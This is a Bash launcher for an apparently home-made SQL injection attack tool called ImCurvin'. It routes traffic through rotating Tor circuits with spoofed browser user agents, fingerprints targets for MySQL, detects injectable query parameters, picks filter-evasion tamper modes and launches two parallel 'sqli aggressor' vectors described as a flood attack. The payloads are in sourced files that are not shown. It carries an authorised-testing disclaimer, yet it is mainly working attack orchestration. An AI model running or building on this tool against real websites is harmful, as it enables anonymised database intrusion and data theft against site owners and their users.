#!/bin/bash

# ImCurvin' v1.3.0
# Copyright 2026 Skokoo
# Licensed under the Apache License, Version 2.0

# Sourced to imcurvin.sh
# Within the boundaries of this primary execution vector, the integration
# of explanatory inline textual annotations has been systematically omitted due
# to a severe diminution of human cognitive and physiological bandwidth.
# This codebase operates under an autonomous, singular-architect paradigm,
# wherein the sole contributing sovereign engineering entity retains independent
# socio-existential commitments external to this digital infrastructure. Furthermore,
# the structural documentation velocity has been deliberately suppressed owing to
# a total deficit of collaborative technical support within my immediate social ecosystem,
# which is entirely populated by non-initiated, computationally unversed individuals.
#
# Consequently, the preservation of non-digital vital functionality overrides
# the mandate for redundant lexical structural breakdowns.
#
# It is my explicit systemic aspiration that the development of this operational
# utility serves to fortify global repository vectors and secure native network infrastructures.
# Inside this volatile landscape, data assets retain absolute existential capital and high financial
# premium. We cross this mortal baseline but a singular iteration.
# I guess, let the code talks... I guess.
# Dont worry, i will add this as soon as possible when i want to.
# Code starts:

target_url="$1"
export DEFIANCE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"

ayamaa=$(date +%H:%M:%S)

source "$DEFIANCE_DIR/../tamper/hungry.sh"
source "${DEFIANCE_DIR}/vector.sh"
source "${DEFIANCE_DIR}/common.sh"

heyoii_d_eb() {
  trap - SIGINT SIGTERM EXIT
  echo -e "\n\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Interrupted. Killing all process.."
  kill 0 2>/dev/null
  exit 130
}

trap 'heyoii_d_eb' SIGINT SIGTERM
custom_proxy=""
export TOR_CIRCUITS=(9050 9052 9054 9056 9058 9060)

export DEFIANCE_UA=(
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)

print_defiance_logo
for cmd in nc curl tor flock pgrep xxd python3; do
  case "$cmd" in
    nc)
      if ! command -v nc &> /dev/null && ! command -v netcat &> /dev/null; then
        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'netcat' is not installed on your terminal." >&2
        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install netcat-openbsd first before running imCurvin'."
        exit 1
      fi
    ;;
    *)
      if ! command -v "$cmd" &> /dev/null; then
        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: '$cmd' is not installed on your terminal." >&2
        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install $cmd first before running imCurvin'."
        exit 1
      fi
    ;;
  esac
done
if [[ "$show_help" = "true" ]]; then
  helping
fi
if [ "$valnow" = "true" ]; then
  echo -e "[\033[34m${ayamaa}\033[0m] [i] Shortcut: Launching standalone Defiance Log Analyst..."
  sleep 1
  if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
    if [ -s "$ROOT_LOG_FILE" ]; then
      python3 "$DEFIANCE_DIR/../validators/defval.py"
      exit 0
    else
      echo -e "[\033[31m${ayamaa}\033[0m] [->] Error: Log file is empty. Nothing to validate." >&2
      exit 1
    fi
  else
    echo -e "[\033[31m${ayamaa}\033[0m] [->] Error: defval.py not found." >&2
    exit 1
  fi
fi
if [[ "$tech" = "true" ]]; then
  show_tech
fi

if [ -z "$target_url" ]; then
  echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Error: URL not specified." >&2
  echo -e "\e[0;37m[\e[0mi\e[0;37m]\e[0m Please refer to the option guide below:\n"
  helping
  exit 1
fi

echo -e "\n[\033[34mWARNING\033[0m] ImCurvin is designed for \033[1mauthorized security testing and educational purposes only.\033[0m"
echo -e "Running this tool against targets without priorwritten consent is strictly illegal. \033[1mThe developer assumes no liability and not responsible for any misuse, damage, or system instability caused by this software.\033[0m By executing this script, you agree to these terms."
sleep 2

echo -e "\n[\033[34m${ayamaa}\033[0m] [i]\e[0m Checking for TOR terminal service..."

if pgrep -x "tor" >/dev/null 2>&1; then
  echo -e "[\033[34m${ayamaa}\033[0m] [i] \033[1mTor terminal service detected as active.\033[0m"
else
  echo -e "[\033[34m${ayamaa}\033[0m] [->] WARNING: Tor terminal service is not detected/running."
  echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
  echo -e "[\033[34m${ayamaa}\033[0m] [->] Operation aborted due to environment mismatch."
  exit 1
fi

echo -e "[\033[34m${ayamaa}\033[0m] [i] Tracing target redirections."
recon_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
  recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"
  initial_url="$target_url"

  final_destination_url=$(curl "$recon_proxy" --connect-timeout 5 --retry 2 -m 8 -s -o /dev/null -w "%{url_effective}" -L "$initial_url")

  if [ "$initial_url" != "$final_destination_url" ]; then
    echo -e "[\033[34m${ayamaa}\033[0m] [!] Target redirected to: \033[32m$final_destination_url\033[0m"
    read -p "[?] Is this URL correct? (y/n): " user_confirm
    user_confirm=$(echo "$user_confirm" | tr '[:upper:]' '[:lower:]')

    case "$user_confirm" in
      y|yes)
        echo -e "[\033[34m${ayamaa}\033[0m] [->] Continue with Redirected URL."
        export target_url="$final_destination_url"
      ;;
      *)
        echo -e "[\033[31m${ayamaa}\033[0m] [i] Continue with default URL will result in an unwanted error,"
        clean_domain=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*||' -e 's|:.*||')
        dork "$clean_domain"
        dork_status=$?
        if [ $dork_status -ne 0 ]; then
          exit 1
        fi
      ;;
    esac
  fi
  if [[ "$skip" = "true" ]]; then
    echo -e "[\033[34m${ayamaa}\033[0m] [i]\e[0m Testing connection to target URL."
    http_status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$target_url")

    case "$http_status" in
      000)
        echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Web Connection time out [10 Seconds]. The target URL might be very unstable."
        exit 1
      ;;
      2??|3??)
      ;;
      *)
        echo -e "[\033[34m${ayamaa}\033[0m] [->]\e[0m Target URL returned HTTP Status $http_status."
        exit 1
      ;;
    esac
  fi
  if [ -f "$DEFIANCE_DIR/../validators/ayam.py" ]; then
    ayamaa=$(date +%H:%M:%S)
    echo -e "[\033[34m${ayamaa}\033[0m] [i] Analyzing parameter.."

    eye_report=$(python3 "$DEFIANCE_DIR/../validators/ayam.py" -u "$target_url")

    param_type=$(echo "$eye_report" | cut -d'|' -f1)
    discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)
    python_method=$(echo "$eye_report" | cut -d'|' -f4)

    case "$param_type" in
      "QUERY_PARAM")
        echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] \033[1mActive Parameters Spotted > ($discovered_keys) [Mode: $python_method]\033[0m"
        export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
        export REQ_METHOD="$python_method"
        export TARGET_PARAM="$discovered_keys"
      ;;

      "PATH_PARAM"|"NO_PARAM"|*)
        echo -e "[\033[34m${ayamaa}\033[0m] [i]\033[1m No parameters detected. Aborted.\033[0m" >&2
        exit 1
      ;;
    esac
  fi

  cookie_flag=""
  if [ -n "$custom_cookie" ]; then
    echo -e "[\033[34m${ayamaa}\033[0m] [i] Verifying custom cookie integrity..."
    check_cookie=$(curl -s -o /dev/null -w "%{http_code}" -b "$custom_cookie" --max-time 10 "$target_url")

    if [ "$check_cookie" = "000" ] || [ "$check_cookie" -lt 200 ] || [ "$check_cookie" -ge 400 ]; then
      echo -e "[\033[31m${ayamaa}\033[0m] [!] Custom Cookie rejected by server (HTTP $check_cookie). Dropping cookie flag." >&2
      custom_cookie=""
    else
      cookie_flag="-b $custom_cookie"
      echo -e "[\033[34m${ayamaa}\033[0m] [+] Custom Cookie validated and locked: $custom_cookie"
    fi
  fi

  echo -e "[\033[34m${ayamaa}\033[0m] [i] Performing database environment verification.."
  server_fingerprint=$(curl "$recon_proxy" -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")

  if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
    echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint." >&2
    echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
    echo -e "[\033[34m${ayamaa}\033[0m][->] Revert. Operation aborted to prevent structural asset wastage."
    exit 1
  else
    echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m]\e[0m \033[1mTarget environment matches MySQL compliance directives.\033[0m"
  fi

  if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
    echo -e "[\033[34m${ayamaa}\033[0m] [i] This web envi is outdated/just a test, to ensure the payloads to be executed, \033[1mthe tamper has been downgraded \033[0m[Space2comment, randomcase only]."
  fi

  sleep 1

  if [ "$enable_val" = "true" ] && [ -s "$ROOT_LOG_FILE" ]; then
    echo -e "[\033[34m${ayamaa}\033[0m] [?] Your log file is not empty."
    read -p "[\033[34m${ayamaa}\033[0m] Do you want to overwrite it? (y/n): " tanya
    tanya=$(echo "$tanya" | tr '[:upper:]' '[:lower:]')

    case "$tanya" in
      y|yes)
        > "$ROOT_LOG_FILE"
        echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m+\e[0m] \033[1mLog overwritten.\033[0m\n"
      ;;
      *)
        echo -e "[\033[34m${ayamaa}\033[0m] [i] Previous log entries will also be scanned."
      ;;
    esac
  fi

  echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"

  vector_sqli_agressor_left &
  pid_vector1=$!

  vector_sqli_agressor_right &
  pid_vector2=$!

  wait $pid_vector1 $pid_vector2

  echo -e "\n[\033[34m${ayamaa}\033[0m] [\033[1mCOMPLETE\033[0m]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
  sleep 1

  if [ "$enable_val" = "true" ]; then
    if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
      python3 "$DEFIANCE_DIR/../validators/defval.py"
    else
      echo -e "[\033[34m${ayamaa}\033[0m] [->] defval.py not found. Skipping validate."
    fi
  else
    echo -e "[\033[34m${ayamaa}\033[0m] [i] Skipping validating, use the option -val to enable it."
  fi

  echo ""